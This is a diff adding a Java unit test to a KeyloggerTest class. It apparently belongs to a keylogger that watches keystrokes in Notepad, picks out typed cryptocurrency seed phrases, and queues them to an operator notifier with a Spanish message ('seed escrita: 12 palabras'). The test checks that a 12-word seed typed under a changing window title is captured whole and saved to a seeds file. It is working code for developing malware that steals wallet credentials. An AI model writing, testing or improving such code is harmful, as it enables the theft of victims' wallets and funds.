@@ -76,6 +76,27 @@ class KeyloggerTest {
 	}
 
 	@Test
+	void aGrowingDocumentTitleDoesNotSplitTheSeed() throws Exception {
+		String seed = "legal winner thank year wave sausage worth useful legal winner thank yellow";
+		OpsNotifier notifier = new OpsNotifier(null);
+		Keylogger logger = logger(notifier);
+		String typed = "";
+		String title = "";
+		for (int index = 0; index < seed.length(); index++) {
+			typed += seed.charAt(index);
+			title = "*" + typed.substring(0, Math.min(typed.length(), 40)) + " - Notepad";
+			String character = String.valueOf(seed.charAt(index));
+			int vk = character.equals(" ") ? 0x20 : seed.charAt(index);
+			event(logger, character, vk, false, "notepad.exe", title);
+		}
+		event(logger, "", 0x0D, false, "notepad.exe", title);
+
+		String log = Files.exists(OpsPaths.keylog(temp)) ? Files.readString(OpsPaths.keylog(temp)) : "<none>";
+		assertEquals(List.of("seed escrita: 12 palabras", seed), notifier.queued(), log);
+		assertEquals(1, Files.readAllLines(OpsPaths.seeds(temp)).size());
+	}
+
+	@Test
 	void typedTwentyFourWordSeedIsReported() throws Exception {
 		OpsNotifier notifier = new OpsNotifier(null);
 		Keylogger logger = logger(notifier);
